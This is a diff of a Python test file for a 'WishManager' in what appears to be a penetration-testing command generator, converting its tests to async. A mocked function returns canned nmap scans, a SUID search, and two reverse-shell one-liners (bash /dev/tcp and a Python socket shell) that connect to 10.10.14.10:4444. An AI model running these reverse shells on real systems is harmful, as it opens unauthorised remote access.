@@ -1,5 +1,6 @@
 import json
-from unittest.mock import MagicMock, mock_open, patch
+import pytest
+from unittest.mock import AsyncMock, MagicMock, mock_open, patch
 
 from wish_models import WishState
 from wish_models.test_factories import WishDoingFactory, WishDoneFactory
@@ -88,21 +89,22 @@ class TestWishManager:
         assert wishes[1].wish == "Wish 1"
         assert wishes[1].state == WishState.DONE
 
-    def test_generate_commands(self):
+    @pytest.mark.asyncio
+    async def test_generate_commands(self):
         """Test that generate_commands returns the expected commands based on the wish text."""
         settings = SettingsFactory.create()
         manager = WishManager(settings)
 
         # Mock the generate_commands method
-        def mock_generate_commands(wish_text):
+        async def mock_generate_commands(wish_text):
             wish_text = wish_text.lower()
             if "scan port" in wish_text:
                 return [
                     "sudo nmap -p- -oA tcp 10.10.10.40",
                     "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40"
-                ]
+                ], None
             elif "find suid" in wish_text:
-                return ["find / -perm -u=s -type f 2>/dev/null"]
+                return ["find / -perm -u=s -type f 2>/dev/null"], None
             elif "reverse shell" in wish_text:
                 return [
                     "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
@@ -110,82 +112,89 @@ class TestWishManager:
                     "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                     "s.connect((\"10.10.14.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                     "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
-                ]
+                ], None
             else:
                 return [
                     f"echo 'Executing wish: {wish_text}'",
                     f"echo 'Processing {wish_text}' && ls -la",
                     "sleep 5"
-                ]
+                ], None
 
         # Replace the generate_commands method with our mock
         manager.generate_commands = mock_generate_commands
 
         # Test with "scan port" in the wish text
-        commands = manager.generate_commands("scan port 80")
+        commands, error = await manager.generate_commands("scan port 80")
         assert len(commands) == 2
         assert "nmap" in commands[0]
+        assert error is None
 
         # Test with "find suid" in the wish text
-        commands = manager.generate_commands("find suid files")
+        commands, error = await manager.generate_commands("find suid files")
         assert len(commands) == 1
         assert "find / -perm -u=s" in commands[0]
+        assert error is None
 
         # Test with "reverse shell" in the wish text
-        commands = manager.generate_commands("create a reverse shell")
+        commands, error = await manager.generate_commands("create a reverse shell")
         assert len(commands) == 3
         assert any("bash -i" in cmd for cmd in commands)
+        assert error is None
 
         # Test with other wish text
-        commands = manager.generate_commands("some other wish")
+        commands, error = await manager.generate_commands("some other wish")
         assert len(commands) == 3
         assert any("echo" in cmd for cmd in commands)
+        assert error is None
 
-    def test_execute_command(self):
+    @pytest.mark.asyncio
+    async def test_execute_command(self):
         """Test that execute_command delegates to the executor."""
         settings = SettingsFactory.create()
         manager = WishManager(settings)
 
         # Mock the executor
-        manager.executor = MagicMock()
+        manager.executor = AsyncMock()
 
         wish = WishDoingFactory.create()
         command = wish.command_results[0].command
         cmd_num = 1
 
         # Execute the command
-        manager.execute_command(wish, command, cmd_num)
+        await manager.execute_command(wish, command, cmd_num)
 
         # Verify that executor.execute_command was called with the correct arguments
         manager.executor.execute_command.assert_called_once_with(wish, command, cmd_num)
 
-    def test_check_running_commands(self):
+    @pytest.mark.asyncio
+    async def test_check_running_commands(self):
         """Test that check_running_commands delegates to the executor."""
         settings = SettingsFactory.create()
         manager = WishManager(settings)
 
         # Mock the executor
-        manager.executor = MagicMock()
+        manager.executor = AsyncMock()
 
         # Check running commands
-        manager.check_running_commands()
+        await manager.check_running_commands()
 
         # Verify that executor.check_running_commands was called
         manager.executor.check_running_commands.assert_called_once()
 
-    def test_cancel_command(self):
+    @pytest.mark.asyncio
+    async def test_cancel_command(self):
         """Test that cancel_command delegates to the executor."""
         settings = SettingsFactory.create()
         manager = WishManager(settings)
         wish = WishDoingFactory.create()
 
         # Mock the executor
-        manager.executor = MagicMock()
+        manager.executor = AsyncMock()
         manager.executor.cancel_command.return_value = "Command 1 cancelled."
 
         # Cancel a command
         cmd_index = 1
-        response = manager.cancel_command(wish, cmd_index)
+        response = await manager.cancel_command(wish, cmd_index)
 
         # Verify that executor.cancel_command was called with the correct arguments
         manager.executor.cancel_command.assert_called_once_with(wish, cmd_index)
